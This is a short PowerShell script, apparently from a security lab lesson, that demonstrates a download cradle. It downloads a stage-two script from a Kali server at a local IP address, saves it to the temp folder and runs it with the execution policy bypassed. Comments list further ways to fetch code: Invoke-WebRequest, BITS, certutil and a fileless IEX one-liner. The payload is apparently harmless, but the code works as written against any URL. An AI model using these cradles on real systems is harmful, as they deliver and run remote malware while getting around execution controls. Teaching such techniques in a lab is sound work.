# PowerShell Download Cradle — Lab Demo
# Downloads and runs calc_payload.ps1 from the Kali HTTP server.
# Shows the most common attacker technique for stage-2 payload delivery.

$url = "http://192.168.11.149:8080/payloads/calc_payload.ps1"
$out = "$env:TEMP\stage2.ps1"

Write-Host "`n[CRADLE] Downloading: $url" -ForegroundColor Yellow

# --- Method shown in lesson (WebClient) ---
(New-Object System.Net.WebClient).DownloadFile($url, $out)
Write-Host "[CRADLE] Saved to $out" -ForegroundColor Green
Write-Host "[CRADLE] Executing..."   -ForegroundColor Yellow

powershell -ExecutionPolicy Bypass -File $out

# --- Other methods students should know (shown, not run) ---
# Invoke-WebRequest  : IWR -Uri $url -OutFile $out -UseBasicParsing
# BITS transfer      : Start-BitsTransfer -Source $url -Destination $out
# certutil (LOLBin)  : certutil -urlcache -split -f $url $out
# Fileless (no disk) : IEX(IWR -Uri $url -UseBasicParsing).Content
